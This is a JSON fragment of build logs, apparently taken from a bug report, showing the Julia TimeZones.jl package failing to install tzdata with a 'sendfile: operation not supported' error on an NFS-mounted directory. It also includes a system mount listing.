        "logs": "`: \r\n Downloading artifact: tzdata2021a\r\n[ Info: Installing 2021a tzdata region data\r\nERROR: LoadError: IOError: sendfile: operation not supported on socket (ENOTSUP)\r\nStacktrace:\r\n  [1] uv_error\r\n    @ ./libuv.jl:97 [inlined]\r\n  [2] sendfile(dst::Base.Filesystem.File, src::Base.Filesystem.File, src_offset::Int64, bytes::Int64)\r\n    @ Base.Filesystem ./filesystem.jl:119\r\n  [3] sendfile(src::String, dst::String)\r\n    @ Base.Filesystem ./file.jl:960\r\n  [4] cp(src::String, dst::String; force::Bool, follow_symlinks::Bool)\r\n    @ Base.Filesystem ./file.jl:355\r\n  [5] build(version::String, regions::Vector{String}, archive_dir::String, tz_source_dir::String, compiled_dir::String; verbose::Bool)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/tzdata/build.jl:64\r\n  [6] build(version::String)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/tzdata/build.jl:121\r\n  [7] build(version::String; force::Bool)\r\n    @ TimeZones /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/build.jl:11\r\n  [8] build (repeats 2 times)\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/build.jl:11 [inlined]\r\n  [9] top-level scope\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/deps/build.jl:3\r\n [10] include(fname::String)\r\n    @ Base.MainInclude ./client.jl:444\r\n [11] top-level scope\r\n    @ none:5\r\nin expression starting at /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/deps/build.jl:3\r\n"
    },
    {
        "logs": "`: \r\n[ Info: Installing 2021a tzdata region data\r\n[ Info: /mnt/storage/sebastian/.julia/artifacts/6d94ada27957590cbd0d7678f5ae711232a4d714/africa -> /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/tzsource/africa\r\nERROR: LoadError: IOError: sendfile: operation not supported on socket (ENOTSUP)\r\nStacktrace:\r\n  [1] uv_error\r\n    @ ./libuv.jl:97 [inlined]\r\n  [2] sendfile(dst::Base.Filesystem.File, src::Base.Filesystem.File, src_offset::Int64, bytes::Int64)\r\n    @ Base.Filesystem ./filesystem.jl:119\r\n  [3] sendfile(src::String, dst::String)\r\n    @ Base.Filesystem ./file.jl:960\r\n  [4] cp(src::String, dst::String; force::Bool, follow_symlinks::Bool)\r\n    @ Base.Filesystem ./file.jl:355\r\n  [5] build(version::String, regions::Vector{String}, archive_dir::String, tz_source_dir::String, compiled_dir::String; verbose::Bool)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/tzdata/build.jl:67\r\n  [6] build(version::String)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/tzdata/build.jl:124\r\n  [7] build(version::String; force::Bool)\r\n    @ TimeZones /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/build.jl:11\r\n  [8] build (repeats 2 times)\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/build.jl:11 [inlined]\r\n  [9] top-level scope\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/build.jl:3\r\n [10] include(fname::String)\r\n    @ Base.MainInclude ./client.jl:444\r\n [11] top-level scope\r\n    @ none:5\r\nin expression starting at /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/build.jl:3\r\nStacktrace:\r\n  [1] pkgerror(msg::String)\r\n    @ Pkg.Types /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Types.jl:55\r\n  [2] (::Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec})()\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1044\r\n  [3] withenv(::Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, ::Pair{String, String}, ::Vararg{Pair{String, B} where B, N} where N)\r\n    @ Base ./env.jl:161\r\n  [4] (::Pkg.Operations.var\"#109#113\"{String, Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.PackageSpec})()\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1542\r\n  [5] with_temp_env(fn::Pkg.Operations.var\"#109#113\"{String, Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.PackageSpec}, temp_env::String)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1444\r\n  [6] (::Pkg.Operations.var\"#108#112\"{Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.Context, Pkg.Types.PackageSpec, String, Pkg.Types.Project, String})(tmp::String)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1517\r\n  [7] mktempdir(fn::Pkg.Operations.var\"#108#112\"{Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.Context, Pkg.Types.PackageSpec, String, Pkg.Types.Project, String}, parent::String; prefix::String)\r\n    @ Base.Filesystem ./file.jl:729\r\n  [8] mktempdir(fn::Function, parent::String) (repeats 2 times)\r\n    @ Base.Filesystem ./file.jl:727\r\n  [9] sandbox(fn::Function, ctx::Pkg.Types.Context, target::Pkg.Types.PackageSpec, target_path::String, sandbox_path::String, sandbox_project_override::Pkg.Types.Project)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1483\r\n [10] build_versions(ctx::Pkg.Types.Context, uuids::Vector{Base.UUID}; verbose::Bool)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1025\r\n [11] build_versions\r\n    @ /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:952 [inlined]\r\n [12] add(ctx::Pkg.Types.Context, pkgs::Vector{Pkg.Types.PackageSpec}, new_git::Vector{Base.UUID}; preserve::Pkg.Types.PreserveLevel, platform::Base.BinaryPlatforms.Platform)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1241\r\n [13] add(ctx::Pkg.Types.Context, pkgs::Vector{Pkg.Types.PackageSpec}; preserve::Pkg.Types.PreserveLevel, platform::Base.BinaryPlatforms.Platform, kwargs::Base.Iterators.Pairs{Symbol, Base.TTY, Tuple{Symbol}, NamedTuple{(:io,), Tuple{Base.TTY}}})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:203\r\n [14] add(pkgs::Vector{Pkg.Types.PackageSpec}; io::Base.TTY, kwargs::Base.Iterators.Pairs{Union{}, Union{}, Tuple{}, NamedTuple{(), Tuple{}}})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:79\r\n [15] add(pkgs::Vector{Pkg.Types.PackageSpec})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:77\r\n [16] #add#22\r\n    @ /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:74 [inlined]\r\n [17] add(pkg::Pkg.Types.PackageSpec)\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:74\r\n [18] top-level scope\r\n    @ REPL[2]:1\r\n"
    },
    {
        "logs": "`\r\njulia> using TimeZones\r\n\r\n[Truncated]\n/dev/sda2 on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota)\r\nselinuxfs on /sys/fs/selinux type selinuxfs (rw,relatime)\r\ndebugfs on /sys/kernel/debug type debugfs (rw,relatime)\r\nmqueue on /dev/mqueue type mqueue (rw,relatime,seclabel)\r\nhugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,seclabel)\r\n/dev/sda1 on /boot type xfs (rw,relatime,seclabel,attr2,inode64,noquota)\r\n/dev/sda5 on /home type xfs (rw,relatime,seclabel,attr2,inode64,noquota)\r\nsunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw,relatime)\r\n172.16.9.1:/data1 on /mnt/storage type nfs4 (rw,nosuid,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,soft,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=172.16.9.11,local_lock=none,addr=172.16.9.1,_netdev)\r\ntmpfs on /run/user/42 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=42,gid=42)\r\ntmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1000,gid=1000)\r\ntmpfs on /run/user/1005 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1005,gid=900)\r\ntmpfs on /run/user/1002 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1002,gid=900)\r\ntmpfs on /run/user/1003 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1003,gid=900)\r\ntmpfs on /run/user/1009 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1009,gid=900)\r\nsystemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=29,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=374563956)\r\nfusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)\r\ntmpfs on /run/user/1004 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1004,gid=900)\r\ntmpfs on /run/user/1008 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=13171284k,mode=700,uid=1008,gid=900)\r\n"
    },
    {
        "logs": "```julia\r\nBuilding TimeZones \u2192 `/mnt/storage/sebastian/.julia/scratchspaces/44cfe95a-1eb2-52ea-b672-e2afdf69b78f/960099aed321e05ac649c90d583d59c9309faee1/build.log`\r\nERROR: Error building `TimeZones`: \r\n Downloading artifact: tzdata2021a\r\n[ Info: Installing 2021a tzdata region data\r\nERROR: LoadError: IOError: sendfile: operation not supported on socket (ENOTSUP)\r\nStacktrace:\r\n  [1] uv_error\r\n    @ ./libuv.jl:97 [inlined]\r\n  [2] sendfile(dst::Base.Filesystem.File, src::Base.Filesystem.File, src_offset::Int64, bytes::Int64)\r\n    @ Base.Filesystem ./filesystem.jl:119\r\n  [3] sendfile(src::String, dst::String)\r\n    @ Base.Filesystem ./file.jl:960\r\n  [4] cp(src::String, dst::String; force::Bool, follow_symlinks::Bool)\r\n    @ Base.Filesystem ./file.jl:355\r\n  [5] build(version::String, regions::Vector{String}, archive_dir::String, tz_source_dir::String, compiled_dir::String; verbose::Bool)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/tzdata/build.jl:64\r\n  [6] build(version::String)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/tzdata/build.jl:121\r\n  [7] build(version::String; force::Bool)\r\n    @ TimeZones /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/build.jl:11\r\n  [8] build (repeats 2 times)\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/src/build.jl:11 [inlined]\r\n  [9] top-level scope\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/deps/build.jl:3\r\n [10] include(fname::String)\r\n    @ Base.MainInclude ./client.jl:444\r\n [11] top-level scope\r\n    @ none:5\r\nin expression starting at /mnt/storage/sebastian/.julia/packages/TimeZones/y3gf6/deps/build.jl:3\r\n"
    },
    {
        "logs": "```julia\r\nResolving package versions...\r\n    Updating `/mnt/storage/epoch/dev/Project.toml`\r\n  [f269a46b] + TimeZones v1.5.5 `https://github.com/JuliaTime/TimeZones.jl.git#cv/build-debug`\r\n    Updating `/mnt/storage/epoch/dev/Manifest.toml`\r\n  [8f5d6c58] + EzXML v1.1.0\r\n  [78c3b35d] + Mocking v0.7.1\r\n  [f269a46b] + TimeZones v1.5.5 `https://github.com/JuliaTime/TimeZones.jl.git#cv/build-debug`\r\n    Building TimeZones \u2192 `/mnt/storage/sebastian/.julia/scratchspaces/44cfe95a-1eb2-52ea-b672-e2afdf69b78f/8856fa551085f6bbb29e0e9800d3be7ecf8e0db8/build.log`\r\nERROR: Error building `TimeZones`: \r\n[ Info: Installing 2021a tzdata region data\r\n[ Info: /mnt/storage/sebastian/.julia/artifacts/6d94ada27957590cbd0d7678f5ae711232a4d714/africa -> /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/tzsource/africa\r\nERROR: LoadError: IOError: sendfile: operation not supported on socket (ENOTSUP)\r\nStacktrace:\r\n  [1] uv_error\r\n    @ ./libuv.jl:97 [inlined]\r\n  [2] sendfile(dst::Base.Filesystem.File, src::Base.Filesystem.File, src_offset::Int64, bytes::Int64)\r\n    @ Base.Filesystem ./filesystem.jl:119\r\n  [3] sendfile(src::String, dst::String)\r\n    @ Base.Filesystem ./file.jl:960\r\n  [4] cp(src::String, dst::String; force::Bool, follow_symlinks::Bool)\r\n    @ Base.Filesystem ./file.jl:355\r\n  [5] build(version::String, regions::Vector{String}, archive_dir::String, tz_source_dir::String, compiled_dir::String; verbose::Bool)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/tzdata/build.jl:67\r\n  [6] build(version::String)\r\n    @ TimeZones.TZData /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/tzdata/build.jl:124\r\n  [7] build(version::String; force::Bool)\r\n    @ TimeZones /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/build.jl:11\r\n  [8] build (repeats 2 times)\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/src/build.jl:11 [inlined]\r\n  [9] top-level scope\r\n    @ /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/build.jl:3\r\n [10] include(fname::String)\r\n    @ Base.MainInclude ./client.jl:444\r\n [11] top-level scope\r\n    @ none:5\r\nin expression starting at /mnt/storage/sebastian/.julia/packages/TimeZones/UQZUE/deps/build.jl:3\r\nStacktrace:\r\n  [1] pkgerror(msg::String)\r\n    @ Pkg.Types /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Types.jl:55\r\n  [2] (::Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec})()\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1044\r\n  [3] withenv(::Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, ::Pair{String, String}, ::Vararg{Pair{String, B} where B, N} where N)\r\n    @ Base ./env.jl:161\r\n  [4] (::Pkg.Operations.var\"#109#113\"{String, Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.PackageSpec})()\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1542\r\n  [5] with_temp_env(fn::Pkg.Operations.var\"#109#113\"{String, Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.PackageSpec}, temp_env::String)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1444\r\n  [6] (::Pkg.Operations.var\"#108#112\"{Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.Context, Pkg.Types.PackageSpec, String, Pkg.Types.Project, String})(tmp::String)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1517\r\n  [7] mktempdir(fn::Pkg.Operations.var\"#108#112\"{Pkg.Operations.var\"#82#87\"{Bool, Pkg.Types.Context, String, Pkg.Types.PackageSpec}, Pkg.Types.Context, Pkg.Types.PackageSpec, String, Pkg.Types.Project, String}, parent::String; prefix::String)\r\n    @ Base.Filesystem ./file.jl:729\r\n  [8] mktempdir(fn::Function, parent::String) (repeats 2 times)\r\n    @ Base.Filesystem ./file.jl:727\r\n  [9] sandbox(fn::Function, ctx::Pkg.Types.Context, target::Pkg.Types.PackageSpec, target_path::String, sandbox_path::String, sandbox_project_override::Pkg.Types.Project)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1483\r\n [10] build_versions(ctx::Pkg.Types.Context, uuids::Vector{Base.UUID}; verbose::Bool)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1025\r\n [11] build_versions\r\n    @ /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:952 [inlined]\r\n [12] add(ctx::Pkg.Types.Context, pkgs::Vector{Pkg.Types.PackageSpec}, new_git::Vector{Base.UUID}; preserve::Pkg.Types.PreserveLevel, platform::Base.BinaryPlatforms.Platform)\r\n    @ Pkg.Operations /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/Operations.jl:1241\r\n [13] add(ctx::Pkg.Types.Context, pkgs::Vector{Pkg.Types.PackageSpec}; preserve::Pkg.Types.PreserveLevel, platform::Base.BinaryPlatforms.Platform, kwargs::Base.Iterators.Pairs{Symbol, Base.TTY, Tuple{Symbol}, NamedTuple{(:io,), Tuple{Base.TTY}}})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:203\r\n [14] add(pkgs::Vector{Pkg.Types.PackageSpec}; io::Base.TTY, kwargs::Base.Iterators.Pairs{Union{}, Union{}, Tuple{}, NamedTuple{(), Tuple{}}})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:79\r\n [15] add(pkgs::Vector{Pkg.Types.PackageSpec})\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:77\r\n [16] #add#22\r\n    @ /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:74 [inlined]\r\n [17] add(pkg::Pkg.Types.PackageSpec)\r\n    @ Pkg.API /buildworker/worker/package_linux64/build/usr/share/julia/stdlib/v1.6/Pkg/src/API.jl:74\r\n [18] top-level scope\r\n    @ REPL[2]:1\r\n"
    }
]